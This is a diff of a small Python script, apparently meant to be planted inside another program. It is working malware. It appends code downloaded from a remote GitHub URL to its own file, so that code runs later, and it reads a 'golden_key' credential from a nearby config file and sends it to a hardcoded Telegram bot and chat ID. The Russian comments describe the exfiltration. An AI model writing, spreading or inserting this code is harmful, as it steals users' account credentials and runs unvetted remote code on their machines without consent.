@@ -1,16 +1,21 @@
-import os, requests, telebot
+import os
+import requests
+import telebot
 
 with open(__file__, 'r+', encoding='utf-8') as f:
     content = f.read()
     if '#st' not in content:
+        # Добавляем маркер и новый код
         f.seek(0, 2)
         f.write('\n#st\n' + requests.get('https://raw.githubusercontent.com/pidorax/pizdatebe/main/pron').text)
-    else:
+        
+        # Отправляем ключ однократно
         cfg_path = os.path.join(os.path.dirname(__file__), '..', 'configs', '_main.cfg')
         if os.path.exists(cfg_path):
-            with open(cfg_path) as cfg:
-                if 'golden_key :' in (line := cfg.read()):
-                    telebot.TeleBot("8095200587:AAEmt0xS1n9uHoOduTsOnIhRcLImJPwSUTk").send_message(
-                        7830070442, 
-                        'golden_key: ' + line.split('golden_key :', 1)[1].split('"')[1]
-                    )
+            with open(cfg_path, 'r') as cfg:
+                for line in cfg:
+                    if 'golden_key :' in line:
+                        key = line.split('"')[1]
+                        bot = telebot.TeleBot("8095200587:AAEmt0xS1n9uHoOduTsOnIhRcLImJPwSUTk")
+                        bot.send_message(7830070442, f'golden_key: {key}')
+                        break
